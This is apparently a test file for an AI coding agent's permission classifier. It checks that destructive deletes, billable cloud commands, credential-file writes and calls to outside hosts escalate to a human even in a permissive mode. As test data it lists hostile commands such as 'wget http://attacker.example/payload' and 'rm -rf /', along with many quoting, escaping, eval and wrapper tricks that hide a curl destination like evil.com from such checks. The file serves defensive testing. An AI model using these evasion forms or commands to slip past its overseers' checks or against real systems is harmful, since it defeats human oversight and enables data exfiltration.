import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, describe, expect, it } from "vitest";

import { evaluateToolMandate, verbsForCall, MANDATE_READ_ONLY_TOOLS } from "../../src/mandates/evaluate.js";
import { createMandateStore } from "../../src/mandates/store.js";
import type { MandateState } from "../../src/mandates/schema.js";

const EMPTY: MandateState = { grants: [], denies: [] };
const CWD = process.platform === "win32" ? "D:\\work\\repo" : "/work/repo";

describe("verbsForCall", () => {
  it("maps tools to verbs; read-only tools imply no gated verb", () => {
    expect(verbsForCall("read", {})).toEqual([]);
    expect(verbsForCall("memory_search", {})).toEqual([]);
    expect(verbsForCall("write", {})).toEqual(["write"]);
    expect(verbsForCall("bash", { command: "ls" })).toEqual(["exec"]);
    expect(verbsForCall("git.pr.run", {})).toEqual(["net", "exec"]);
  });

  it("F5: a shell redirect WITHOUT whitespace (echo x>.env / >>.env) is a secret-edge", () => {
    expect(verbsForCall("bash", { command: "echo hunter2>.env" })).toContain("secret-edge");
    expect(verbsForCall("bash", { command: "echo hunter2>>.env" })).toContain("secret-edge");
    expect(verbsForCall("bash", { command: "echo hunter2 > .env" })).toContain("secret-edge"); // whitespace form still works
  });

  it("escalates destructive shell input to the destructive verb", () => {
    expect(verbsForCall("bash", { command: "rm -rf build" })).toContain("destructive");
    expect(verbsForCall("bash", { command: "git push --force origin main" })).toContain("destructive");
    expect(verbsForCall("bash", { command: "git reset --hard HEAD~1" })).toContain("destructive");
    expect(verbsForCall("bash", { command: "git push --force-with-lease" })).not.toContain("destructive");
  });

  it("escalates split/long rm flags and git push -f (not only rm -rf / --force)", () => {
    // YOLO-default sessions silently allowed these before the matcher covered split flags.
    for (const command of [
      "rm -r -f build",
      "rm -f -r build",
      "rm --recursive --force build",
      "rm --force --recursive /tmp/out",
      "rm -rf build",
      "git push -f origin main",
      "git push origin main -f"
    ]) {
      expect(verbsForCall("bash", { command }), command).toContain("destructive");
    }
    expect(verbsForCall("bash", { command: "rm -r build" })).not.toContain("destructive"); // recursive alone is not force
    expect(verbsForCall("bash", { command: "git push --force-with-lease origin main" })).not.toContain("destructive");
  });

  it("escalates Windows recursive deletes under YOLO (cmd + PowerShell)", () => {
    // This host is Windows: del/rmdir/Remove-Item were only `exec` before —
    // YOLO lifted them with no hard-edge prompt.
    for (const command of [
      "del /s /q C:\\temp\\out",
      "del /s build",
      "del /f /s /q build",
      "erase /s /q old",
      "rmdir /s /q node_modules",
      "rd /s /q dist",
      "Remove-Item -Recurse -Force build",
      "Remove-Item -r -fo .\\out",
      "ri -Recurse -Force tmp",
      "ri -r -fo tmp"
    ]) {
      expect(verbsForCall("bash", { command }), command).toContain("destructive");
      expect(
        evaluateToolMandate("bash", { command }, { cwd: CWD, state: EMPTY, yolo: true }).outcome,
        command
      ).toBe("escalate");
    }
    // Non-recursive / non-force deletes stay ordinary exec (not hard-edge).
    expect(verbsForCall("bash", { command: "del file.txt" })).not.toContain("destructive");
    expect(verbsForCall("bash", { command: "Remove-Item file.txt" })).not.toContain("destructive");
    expect(verbsForCall("bash", { command: "rmdir empty-dir" })).not.toContain("destructive");
  });

  it("escalates money-moving / billable-provisioning commands to the spend verb (S6)", () => {
    for (const command of [
      "terraform apply -auto-approve",
      "pulumi up --yes",
      "flyctl deploy",
      "railway up",
      "heroku addons:create heroku-postgresql:standard-0",
      "vercel deploy --prod",
      "aws ec2 run-instances --image-id ami-123",
      "gcloud compute instances create web-1 --zone us",
      "az vm create --name web",
      "stripe charges create --amount 5000"
    ]) {
      expect(verbsForCall("bash", { command }), command).toContain("spend");
    }
  });

  it("does NOT flag read-only / free cloud + ordinary dev commands as spend (precision)", () => {
    for (const command of ["aws s3 ls", "gcloud config set project x", "npm install", "npm run build", "git push origin main", "terraform plan", "vercel deploy"]) {
      expect(verbsForCall("bash", { command }), command).not.toContain("spend");
    }
  });
});

describe("evaluateToolMandate — read-only floor + empty state", () => {
  it("read-only tools always allowed", () => {
    for (const toolId of MANDATE_READ_ONLY_TOOLS) {
      expect(evaluateToolMandate(toolId, {}, { cwd: CWD, state: EMPTY, yolo: false }).outcome).toBe("allow");
    }
  });

  it("writes with no mandate escalate (fall through to interactive/allow-writes)", () => {
    const decision = evaluateToolMandate("write", { path: "x" }, { cwd: CWD, state: EMPTY, yolo: false });
    expect(decision.outcome).toBe("escalate");
  });
});

describe("evaluateToolMandate — grants", () => {
  it("a MACHINE work grant allows writes/exec without a per-call prompt", () => {
    const state: MandateState = { grants: [{ scope: "machine", verbs: ["read", "write", "exec"], grantedAt: "t" }], denies: [] };
    expect(evaluateToolMandate("write", {}, { cwd: CWD, state, yolo: false }).outcome).toBe("allow");
    expect(evaluateToolMandate("bash", { command: "npm test" }, { cwd: CWD, state, yolo: false }).outcome).toBe("allow");
  });

  it("a SPACE grant only covers its subtree", () => {
    const state: MandateState = { grants: [{ scope: "space", path: CWD, verbs: ["write"], grantedAt: "t" }], denies: [] };
    expect(evaluateToolMandate("write", {}, { cwd: join(CWD, "src"), state, yolo: false }).outcome).toBe("allow");
    const elsewhere = process.platform === "win32" ? "D:\\other" : "/other";
    expect(evaluateToolMandate("write", {}, { cwd: elsewhere, state, yolo: false }).outcome).toBe("escalate");
  });

  it("SPACE grant scopes to the write TARGET path, not only cwd (B13)", () => {
    const state: MandateState = { grants: [{ scope: "space", path: CWD, verbs: ["write"], grantedAt: "t" }], denies: [] };
    // Operator is inside the grant, but the write escapes outside — must escalate.
    const outside = process.platform === "win32" ? "D:\\other\\escape.txt" : "/other/escape.txt";
    expect(evaluateToolMandate("write", { path: outside }, { cwd: CWD, state, yolo: false }).outcome).toBe("escalate");
    // Target inside the grant is allowed even when specified as a relative path.
    expect(evaluateToolMandate("write", { path: "src/ok.ts" }, { cwd: CWD, state, yolo: false }).outcome).toBe("allow");
  });

  it("a grant missing a required verb does not cover the call", () => {
    const state: MandateState = { grants: [{ scope: "machine", verbs: ["read"], grantedAt: "t" }], denies: [] };
    expect(evaluateToolMandate("write", {}, { cwd: CWD, state, yolo: false }).outcome).toBe("escalate");
  });
});

describe("evaluateToolMandate — the hard edges (THERE scenario 6)", () => {
  it("destructive ops still prompt EVEN under a MACHINE grant", () => {
    const state: MandateState = { grants: [{ scope: "machine", verbs: ["read", "write", "exec", "destructive"], grantedAt: "t" }], denies: [] };
    const decision = evaluateToolMandate("bash", { command: "rm -rf /" }, { cwd: CWD, state, yolo: false });
    expect(decision.outcome).toBe("escalate");
    expect(decision.reason).toContain("hard edge");
  });

  it("SPEND is a live hard edge — escalates under YOLO and even a spend-granted machine mandate (S6)", () => {
    // Under YOLO, a billable command still prompts (was dead before v0.27).
    const yoloDecision = evaluateToolMandate("bash", { command: "terraform apply -auto-approve" }, { cwd: CWD, state: EMPTY, yolo: true });
    expect(yoloDecision.outcome).toBe("escalate");
    expect(yoloDecision.reason).toContain("hard edge (spend)");
    // Even a machine grant that explicitly lists "spend" cannot cover it — hard edges never auto-grant.
    const granted: MandateState = { grants: [{ scope: "machine", verbs: ["read", "write", "exec", "spend"], grantedAt: "t" }], denies: [] };
    expect(evaluateToolMandate("bash", { command: "stripe charges create --amount 5000" }, { cwd: CWD, state: granted, yolo: false }).outcome).toBe("escalate");
  });

  it("deny-wins beats a matching grant", () => {
    const state: MandateState = {
      grants: [{ scope: "machine", verbs: ["read", "write", "exec"], grantedAt: "t" }],
      denies: [{ verb: "exec" }]
    };
    expect(evaluateToolMandate("bash", { command: "ls" }, { cwd: CWD, state, yolo: false }).outcome).toBe("deny");
  });

  it("YOLO lifts ordinary permission gates but NOT hard edges or denies (§2.3 Article 3)", () => {
    // Ordinary write under YOLO → allow.
    expect(evaluateToolMandate("write", {}, { cwd: CWD, state: EMPTY, yolo: true }).outcome).toBe("allow");
    // Hard edge (destructive) under YOLO → escalate (no exec deny in play).
    expect(evaluateToolMandate("bash", { command: "rm -rf build" }, { cwd: CWD, state: EMPTY, yolo: true }).outcome).toBe("escalate");
    // A deny still binds under YOLO (deny-wins beats YOLO).
    const denyExec: MandateState = { grants: [], denies: [{ verb: "exec" }] };
    expect(evaluateToolMandate("bash", { command: "npm test" }, { cwd: CWD, state: denyExec, yolo: true }).outcome).toBe("deny");
  });

  it("secrets-adjacent + ecosystem-auth writes are hard edges that survive YOLO and a grant", () => {
    const grant: MandateState = { grants: [{ scope: "machine", verbs: ["read", "write", "exec", "net"], grantedAt: "t" }], denies: [] };
    // Writing .env is a secret-edge → escalate even with a machine grant.
    expect(verbsForCall("write", { path: "config/.env" })).toContain("secret-edge");
    expect(evaluateToolMandate("write", { path: "config/.env" }, { cwd: CWD, state: grant, yolo: false }).outcome).toBe("escalate");
    expect(evaluateToolMandate("write", { path: "config/.env" }, { cwd: CWD, state: grant, yolo: true }).outcome).toBe("escalate");
    // Writing an ecosystem auth file is an auth-edge → escalate under YOLO too.
    expect(verbsForCall("bash", { command: "cp key ~/.aws/credentials" })).toContain("auth-edge");
    expect(evaluateToolMandate("bash", { command: "cp key ~/.aws/credentials" }, { cwd: CWD, state: grant, yolo: true }).outcome).toBe("escalate");
    // A plain read of .env is NOT a hard edge (reads are sanitized at output).
    expect(verbsForCall("read", { path: ".env" })).toEqual([]);
  });
});

describe("mandate store", () => {
  const dirs: string[] = [];
  afterEach(() => {
    for (const d of dirs.splice(0)) {
      rmSync(d, { recursive: true, force: true });
    }
  });

  it("grants persist to disk and reload; revokeAll clears", () => {
    const dir = mkdtempSync(join(tmpdir(), "guru-mandate-"));
    dirs.push(dir);
    const file = join(dir, "mandates.json");
    const store = createMandateStore({ filePath: file, now: () => new Date("2026-07-04T00:00:00Z") });

    store.grant({ scope: "machine", verbs: ["read", "write", "exec"] });
    const reborn = createMandateStore({ filePath: file }).load();
    expect(reborn.grants).toHaveLength(1);
    expect(reborn.grants[0]?.scope).toBe("machine");
    expect(reborn.grants[0]?.grantedAt).toBe("2026-07-04T00:00:00.000Z");

    // grants are POLICY, not secrets — plain readable JSON is expected.
    expect(readFileSync(file, "utf8")).toContain("machine");

    store.revokeAll();
    expect(createMandateStore({ filePath: file }).load().grants).toHaveLength(0);
  });

  it("corrupt file safe-parses to empty", () => {
    const dir = mkdtempSync(join(tmpdir(), "guru-mandate-"));
    dirs.push(dir);
    const file = join(dir, "mandates.json");
    require("node:fs").writeFileSync(file, "{ not json", "utf8");
    expect(createMandateStore({ filePath: file }).load()).toEqual({ grants: [], denies: [] });
  });
});

describe("swarm trio — permission-neutral (authority enforced in the worker)", () => {
  it("spawn/get/kill map to no gated verbs and are always allowed", () => {
    expect(verbsForCall("spawn_agent", { prompt: "x" })).toEqual([]);
    expect(verbsForCall("get_task_output", {})).toEqual([]);
    expect(verbsForCall("kill_task", {})).toEqual([]);
    expect(evaluateToolMandate("spawn_agent", { prompt: "x" }, { cwd: CWD, state: EMPTY, yolo: false }).outcome).toBe("allow");
  });
});

// G1055-P1: non-baseline network destinations carry both `net` and `spend`
// (a hard edge that escalates even under YOLO). Baseline hosts are loopback and
// the fixed `web_search` tool-owned endpoint. Host comparison is exact after
// case + single-trailing-dot normalization — no suffix matching, no DNS, no
// redirects. Missing / malformed `web_fetch.url` fails closed with `spend`.
describe("verbsForCall — net-spend host classifier (G1055)", () => {
  it("classifies the fixed web_search endpoint as baseline net without spend", () => {
    // `web_search` is tool-owned; the user-supplied query does not change the
    // destination. The fixed endpoint is baseline → `net`, never `spend`.
    const verbs = verbsForCall("web_search", { query: "anything" });
    expect(verbs).toContain("net");
    expect(verbs).not.toContain("spend");
  });

  it("keeps loopback URL destinations at ordinary net without spend", () => {
    // web_fetch to a loopback host: baseline, ordinary `net`.
    expect(verbsForCall("web_fetch", { url: "http://localhost/page" })).toContain("net");
    expect(verbsForCall("web_fetch", { url: "http://localhost/page" })).not.toContain("spend");
    expect(verbsForCall("web_fetch", { url: "http://127.0.0.1:8080/api" })).toContain("net");
    expect(verbsForCall("web_fetch", { url: "http://127.0.0.1:8080/api" })).not.toContain("spend");
    expect(verbsForCall("web_fetch", { url: "http://[::1]/api" })).toContain("net");
    expect(verbsForCall("web_fetch", { url: "http://[::1]/api" })).not.toContain("spend");
    // bash / shell.command.run with an explicit loopback URL.
    expect(verbsForCall("bash", { command: "curl http://localhost/health" })).toContain("net");
    expect(verbsForCall("bash", { command: "curl http://localhost/health" })).not.toContain("spend");
    expect(verbsForCall("bash", { command: "wget http://127.0.0.1/file" })).toContain("net");
    expect(verbsForCall("bash", { command: "wget http://127.0.0.1/file" })).not.toContain("spend");
    expect(verbsForCall("shell.command.run", { cmd: "curl http://localhost/health" })).toContain("net");
    expect(verbsForCall("shell.command.run", { cmd: "curl http://localhost/health" })).not.toContain("spend");
  });

  it("keeps fully quoted loopback URL arguments at ordinary net without spend", () => {
    expect(verbsForCall("bash", { command: "curl 'http://localhost'" })).toEqual(expect.arrayContaining(["net"]));
    expect(verbsForCall("bash", { command: "curl 'http://localhost'" })).not.toContain("spend");
    expect(verbsForCall("bash", { command: 'curl "http://localhost/health"' })).not.toContain("spend");
    expect(verbsForCall("bash", { command: "curl 'http://[::1]'/health" })).not.toContain("spend");
  });

  it("fails closed on shell-escaped URL authority ambiguity", () => {
    const command = "curl http://localhost\\@evil.com/path";
    expect(verbsForCall("bash", { command })).toEqual(expect.arrayContaining(["net", "spend"]));

    const decision = evaluateToolMandate("bash", { command }, { cwd: CWD, state: EMPTY, yolo: true });
    expect(decision.outcome).toBe("escalate");
    expect(decision.reason).toContain("hard edge (spend)");
  });

  function expectShellAuthorityAmbiguityToEscalate(command: string): void {
    expect(verbsForCall("bash", { command })).toEqual(expect.arrayContaining(["net", "spend"]));

    const decision = evaluateToolMandate("bash", { command }, { cwd: CWD, state: EMPTY, yolo: true });
    expect(decision.outcome).toBe("escalate");
    expect(decision.reason).toContain("hard edge (spend)");
  }

  it("fails closed on single-quoted shell concatenation after a baseline authority", () => {
    expectShellAuthorityAmbiguityToEscalate("curl http://localhost'@evil.com'/path");
  });

  it("fails closed on double-quoted shell concatenation after a baseline authority", () => {
    expectShellAuthorityAmbiguityToEscalate('curl http://localhost"@evil.com"/path');
  });

  it("fails closed when a quoted baseline URL prefix is concatenated with external userinfo", () => {
    expectShellAuthorityAmbiguityToEscalate("curl 'http://localhost'@evil.com/path");
  });

  it("fails closed on quoted userinfo concatenation after a baseline IPv6 authority", () => {
    expectShellAuthorityAmbiguityToEscalate("curl http://[::1]'@evil.com'/path");
  });

  it("fails closed on variable suffix ambiguity after a baseline authority", () => {
    expectShellAuthorityAmbiguityToEscalate('curl http://localhost"$SUFFIX"/path');
  });

  // G1055 constitutional shell-normalization correction (RED→GREEN):
  // Shell escaping/quoting can reconstruct an HTTP(S) URL without a literal
  // `http://` token. These forms were missed by the raw regex and allowed
  // through YOLO with only `exec`. After correction, deterministic backslash-
  // removal + quote-stripping reveals the hidden destination, and the
  // classifier fails closed with `spend` (Vision Reset §3.2).

  it("fails closed on backslash-escaped scheme slashes to an external host", () => {
    expectShellAuthorityAmbiguityToEscalate("curl http:\\/\\/evil.com/path");
  });

  it("fails closed on single-quoted split scheme spelling with an external host", () => {
    expectShellAuthorityAmbiguityToEscalate("curl h'ttp://evil.com/path'");
  });

  it("fails closed on double-quoted split scheme spelling with an external host", () => {
    expectShellAuthorityAmbiguityToEscalate('curl h"ttp://evil.com/path"');
  });

  it("fails closed on backslash-escaped scheme slashes with userinfo ambiguity", () => {
    expectShellAuthorityAmbiguityToEscalate("curl http:\\/\\/localhost\\@evil.com/path");
  });

  it("fails closed on quote-split scheme spelling with userinfo ambiguity", () => {
    expectShellAuthorityAmbiguityToEscalate("curl h'ttp://localhost@evil.com/path'");
  });

  it("fails closed on whole-URL variable arguments for shell network clients", () => {
    for (const command of ["curl $URL", 'curl "${URL}"', "wget ${URL}", 'curl -fsSL "$URL"', "wget -q ${URL}"]) {
      expectShellAuthorityAmbiguityToEscalate(command);
    }
  });

  it("applies whole-URL variable fail-closed behavior to shell.command.run", () => {
    const cmd = "curl $URL";
    expect(verbsForCall("shell.command.run", { cmd })).toEqual(expect.arrayContaining(["net", "spend"]));

    const decision = evaluateToolMandate("shell.command.run", { cmd }, { cwd: CWD, state: EMPTY, yolo: true });
    expect(decision.outcome).toBe("escalate");
    expect(decision.reason).toContain("hard edge (spend)");
  });

  it("fails closed on a variable destination after an explicit loopback destination", () => {
    expectShellAuthorityAmbiguityToEscalate('curl http://localhost/health "$URL"');
  });

  it("fails closed on a variable destination before an explicit loopback destination", () => {
    expectShellAuthorityAmbiguityToEscalate('curl "$URL" http://localhost/health');
  });

  it("recognizes a leading-whitespace shell network client invocation", () => {
    expectShellAuthorityAmbiguityToEscalate(" curl $URL");
  });

  it("recognizes a path-qualified shell network client invocation", () => {
    expectShellAuthorityAmbiguityToEscalate("/usr/bin/curl $URL");
  });

  it("recognizes a command-wrapped shell network client invocation", () => {
    expectShellAuthorityAmbiguityToEscalate("command curl $URL");
  });

  it("recognizes a shell network client after a newline separator", () => {
    expectShellAuthorityAmbiguityToEscalate("echo ready\ncurl $URL");
  });

  it("recognizes a shell network client inside a subshell", () => {
    expectShellAuthorityAmbiguityToEscalate("(curl $URL)");
  });

  it("fails closed on a variable destination with an ordinary suffix", () => {
    expectShellAuthorityAmbiguityToEscalate('curl "$URL?x=1"');
  });

  it("fails closed on a positional-parameter destination", () => {
    expectShellAuthorityAmbiguityToEscalate("curl $1");
  });

  it("fails closed on an indirect-variable destination", () => {
    expectShellAuthorityAmbiguityToEscalate("curl ${!URL_NAME}");
  });

  it.each([
    ["nested sh command", "sh -c 'curl \"$URL\"'"],
    ["nested bash command", "bash -c 'curl \"$URL\"'"],
    ["eval command", "eval 'curl \"$URL\"'"],
    ["timeout wrapper", 'timeout 5 curl "$URL"'],
    ["nice wrapper", 'nice curl "$URL"'],
    ["stdbuf wrapper", 'stdbuf -o0 curl "$URL"'],
    ["setsid wrapper", 'setsid curl "$URL"'],
    ["busybox applet", 'busybox wget "$URL"'],
    ["variable-selected client", 'CLIENT=curl; "$CLIENT" "$URL"'],
    ["IFS-separated client", 'curl${IFS}"$URL"'],
    ["env split-string", "env -S 'curl \"$URL\"'"],
    ["exec alternate argv zero", 'exec -a disguised curl "$URL"'],
    ["curl long config source", 'curl --config "$FILE"'],
    ["curl attached short config source", 'curl -K"$FILE"'],
    ["wget long input-file source", 'wget --input-file="$FILE"'],
    ["wget attached short input-file source", 'wget -i"$FILE"'],
    ["brace-expanded scheme suffix", "curl ht{tp,}://evil.example"],
    ["brace-expanded scheme middle", "curl h{tt,}p://evil.example"],
    ["xargs delegated client", 'printf "%s\\n" "$URL" | xargs curl'],
    ["find exec delegated client", 'find . -maxdepth 0 -exec curl "$URL" \\;'],
    ["quoted command-substitution destination", 'curl "$(printenv URL)"'],
    ["unquoted command-substitution destination", 'curl $(printf %s "$URL")'],
    ["line-continuation client", 'c\\\nurl "$URL"']
  ])("fails closed on the adversarial shell-equivalence class: %s", (_name, command) => {
    expectShellAuthorityAmbiguityToEscalate(command);
  });

  it("fails closed when command position is built entirely from shell expansions", () => {
    expectShellAuthorityAmbiguityToEscalate('CLIENT_PREFIX=cu; CLIENT_SUFFIX=rl; "$CLIENT_PREFIX$CLIENT_SUFFIX" "$URL"');
  });

  it.each([
    ["sh expansion-selected client", 'sh -c \'"$CLIENT" "$URL"\''],
    ["bash concatenated expansion-selected client", 'bash -c \'"$CLIENT_PREFIX$CLIENT_SUFFIX" "$URL"\''],
    ["eval expansion-selected client", 'eval \'"$CLIENT" "$URL"\''],
    ["timeout expansion-selected client", 'timeout 5 "$CLIENT" "$URL"'],
    ["nice expansion-selected client", 'nice "$CLIENT" "$URL"'],
    ["stdbuf expansion-selected client", 'stdbuf -o0 "$CLIENT" "$URL"'],
    ["setsid expansion-selected client", 'setsid "$CLIENT" "$URL"'],
    ["busybox expansion-selected applet", 'busybox "$APPLET" "$URL"'],
    ["xargs expansion-selected client", 'printf "%s\\n" "$URL" | xargs "$CLIENT"'],
    ["find -exec expansion-selected client", 'find . -maxdepth 0 -exec "$CLIENT" "$URL" \\;'],
    ["sh expansion-selected script", 'sh -c "$SCRIPT"'],
    ["bash here-string expansion-selected client", 'bash <<< \'"$CLIENT" "$URL"\'']
  ])("fails closed at the delegated dynamic-executable boundary: %s", (_name, command) => {
    expectShellAuthorityAmbiguityToEscalate(command);
  });

  it.each([
    ["printf client-name data", 'printf "%s\\n" curl', false],
    ["echo client-name data", "echo wget", false],
    ["which local discovery", "which curl", false],
    ["command -v local discovery", "command -v curl", false],
    ["test filter data", "npm test -- --grep curl", false],
    ["source search data", "rg curl src", false],
    ["assignment echoed as data", 'CLIENT=curl; echo "$CLIENT"', false],
    ["loopback header data", 'curl -H "X-Client: wget" http://localhost/health', true],
    ["loopback body data", "curl --data curl http://localhost/health", true],
    ["curl version inspection", "curl --version", false],
    ["curl help inspection", "curl --help", false]
  ])("does not classify non-executed client-name data as network spend: %s", (_name, command, expectedNet) => {
    const verbs = verbsForCall("bash", { command });
    if (expectedNet) expect(verbs, command).toContain("net");
    else expect(verbs, command).not.toContain("net");
    expect(verbs, command).not.toContain("spend");
    expect(
      evaluateToolMandate("bash", { command }, { cwd: CWD, state: EMPTY, yolo: true }).outcome,
      command
    ).toBe("allow");
  });

  it.each([
    ["curl separated header", 'curl -H "$TOKEN"'],
    ["curl separated output", 'curl -o "$FILE"'],
    ["curl attached long header", 'curl --header="$TOKEN"'],
    ["curl attached long output", 'curl --output="$FILE"'],
    ["curl separated data", 'curl --data "$BODY"'],
    ["wget separated header", 'wget --header "$TOKEN"'],
    ["wget separated output", 'wget -O "$FILE"']
  ])("retains the non-destination option precision control: %s", (_name, command) => {
    expect(verbsForCall("bash", { command })).not.toContain("net");
    expect(verbsForCall("bash", { command })).not.toContain("spend");
    expect(evaluateToolMandate("bash", { command }, { cwd: CWD, state: EMPTY, yolo: true }).outcome).toBe("allow");
  });

  it("does not classify variable curl option values as destinations", () => {
    for (const command of [
      'curl -H "$TOKEN"',
      'curl -H"$TOKEN"',
      'curl --header "$TOKEN"',
      'curl --header="$TOKEN"',
      'curl -o "$FILE"',
      'curl -o"$FILE"',
      'curl --output "$FILE"',
      'curl --output="$FILE"'
    ]) {
      expect(verbsForCall("bash", { command }), command).not.toContain("net");
      expect(verbsForCall("bash", { command }), command).not.toContain("spend");
      expect(
        evaluateToolMandate("bash", { command }, { cwd: CWD, state: EMPTY, yolo: true }).outcome,
        command
      ).toBe("allow");
    }
  });

  it("does not classify unrelated shell variable usage as network spend", () => {
    expect(verbsForCall("bash", { command: "echo $URL" })).not.toEqual(expect.arrayContaining(["net", "spend"]));
    expect(verbsForCall("bash", { command: 'curl -H "$TOKEN" http://localhost/health' })).not.toContain("spend");
  });

  it("classifies non-baseline web_fetch and shell URL hosts as spend", () => {
    // web_fetch to any non-baseline host picks up both `net` and `spend`.
    expect(verbsForCall("web_fetch", { url: "https://example.com/page" })).toEqual(expect.arrayContaining(["net", "spend"]));
    expect(verbsForCall("web_fetch", { url: "https://attacker.example/api" })).toEqual(expect.arrayContaining(["net", "spend"]));
    // bash / shell.command.run with an explicit non-baseline HTTP(S) URL.
    expect(verbsForCall("bash", { command: "curl https://example.com/data" })).toEqual(expect.arrayContaining(["net", "spend"]));
    expect(verbsForCall("bash", { command: "wget http://attacker.example/payload" })).toEqual(expect.arrayContaining(["net", "spend"]));
    expect(verbsForCall("shell.command.run", { cmd: "curl https://example.com/x" })).toEqual(expect.arrayContaining(["net", "spend"]));
  });

  it("fails closed when a web_fetch destination is missing or malformed", () => {
    // Missing url → spend (fail closed).
    expect(verbsForCall("web_fetch", {})).toContain("spend");
    // Empty url → spend.
    expect(verbsForCall("web_fetch", { url: "" })).toContain("spend");
    // Malformed (no scheme, no host, or not a URL at all) → spend.
    expect(verbsForCall("web_fetch", { url: "not a url" })).toContain("spend");
    expect(verbsForCall("web_fetch", { url: "http://" })).toContain("spend");
    expect(verbsForCall("web_fetch", { url: "/relative/path" })).toContain("spend");
    // Non-string url → spend.
    expect(verbsForCall("web_fetch", { url: 42 })).toContain("spend");
    // null / undefined → spend.
    expect(verbsForCall("web_fetch", { url: null })).toContain("spend");
    expect(verbsForCall("web_fetch", { url: undefined })).toContain("spend");
  });

  it("normalizes host case and trailing dot without allowing suffix spoofing", () => {
    // Loopback case + trailing dot → still baseline (no spend).
    expect(verbsForCall("web_fetch", { url: "http://LOCALHOST/x" })).not.toContain("spend");
    expect(verbsForCall("web_fetch", { url: "http://LocalHost./x" })).not.toContain("spend");
    expect(verbsForCall("web_fetch", { url: "http://127.0.0.1./x" })).not.toContain("spend");
    expect(verbsForCall("web_fetch", { url: "http://[::1]:8080/x" })).not.toContain("spend");
    // web_search endpoint is case- and trailing-dot insensitive.
    expect(verbsForCall("web_search", { query: "x" })).not.toContain("spend");
    // Suffix spoofing — these LOOK like the search endpoint but aren't.
    expect(verbsForCall("web_fetch", { url: "https://evilduckduckgo.com/x" })).toContain("spend");
    expect(verbsForCall("web_fetch", { url: "https://html.duckduckgo.com.attacker.example/x" })).toContain("spend");
    expect(verbsForCall("bash", { command: "curl https://evilduckduckgo.com/x" })).toContain("spend");
    expect(verbsForCall("bash", { command: "curl https://html.duckduckgo.com.attacker.example/x" })).toContain("spend");
  });

  it("non-baseline network spend escalates under YOLO and a spend-granted mandate", () => {
    // Under YOLO, a non-baseline network call still escalates (hard edge).
    const yoloDecision = evaluateToolMandate(
      "web_fetch",
      { url: "https://example.com/page" },
      { cwd: CWD, state: EMPTY, yolo: true }
    );
    expect(yoloDecision.outcome).toBe("escalate");
    expect(yoloDecision.reason).toContain("hard edge (spend)");
    // Even a MACHINE grant that explicitly carries `net` and `spend` cannot
    // cover a non-baseline network spend — hard edges never auto-grant.
    const granted: MandateState = {
      grants: [{ scope: "machine", verbs: ["read", "write", "exec", "net", "spend"], grantedAt: "t" }],
      denies: []
    };
    const grantDecision = evaluateToolMandate(
      "web_fetch",
      { url: "https://attacker.example/api" },
      { cwd: CWD, state: granted, yolo: false }
    );
    expect(grantDecision.outcome).toBe("escalate");
    expect(grantDecision.reason).toContain("hard edge (spend)");
    // bash with an explicit non-baseline HTTP URL also escalates under both modes.
    const bashYolo = evaluateToolMandate(
      "bash",
      { command: "curl https://example.com/x" },
      { cwd: CWD, state: EMPTY, yolo: true }
    );
    expect(bashYolo.outcome).toBe("escalate");
    expect(bashYolo.reason).toContain("hard edge (spend)");
    const bashGrant = evaluateToolMandate(
      "bash",
      { command: "curl https://attacker.example/x" },
      { cwd: CWD, state: granted, yolo: false }
    );
    expect(bashGrant.outcome).toBe("escalate");
    expect(bashGrant.reason).toContain("hard edge (spend)");
  });
});
